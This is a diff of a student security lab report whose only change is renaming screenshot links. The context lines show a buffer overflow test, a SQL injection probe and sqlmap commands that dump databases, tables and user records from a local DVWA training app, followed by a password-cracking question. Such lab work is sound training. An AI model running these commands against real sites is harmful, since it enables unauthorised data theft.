@@ -95,7 +95,7 @@ r $(python -c "print('A' * 32)")
 ```
 info registers esp
 ```
-![alt text](Screenshot 2024-10-21 093246.png)
+![alt text](Screenshot2024-10-21093246.png)
 
 output screenshot (optional)
 
@@ -118,13 +118,13 @@ http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#
 ```
 http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit#
 ```
-![alt text](Screenshot 2024-10-21 100741.png)
+![alt text](Screenshot2024-10-21100741.png)
 
 b)Use sqlmap to get information about all available databases
 ```
 python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=6o88lqnu5evhq7m6tio1bsnmg2; security=low" --dbs
 ```
-![alt text](Screenshot 2024-10-21 103025.png)
+![alt text](Screenshot2024-10-21103025.png)
 
 
 **Question 2**: Use sqlmap to get tables, users information
@@ -134,7 +134,7 @@ a) Use sqlmap to get tables:
 python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=6o88lqnu5evhq7m6tio1bsnmg2; security=low" -D dvwa --tables
 ```
 -This is table of dvwa:
-![alt text](Screenshot 2024-10-21 103822.png)
+![alt text](Screenshot2024-10-21103822.png)
 
 b) Use sqlmap to get users informations:
 ```
@@ -142,7 +142,7 @@ python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"
 ```
 
 -This is users informations:
-![alt text](Screenshot 2024-10-21 104553.png)
+![alt text](Screenshot2024-10-21104553.png)
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
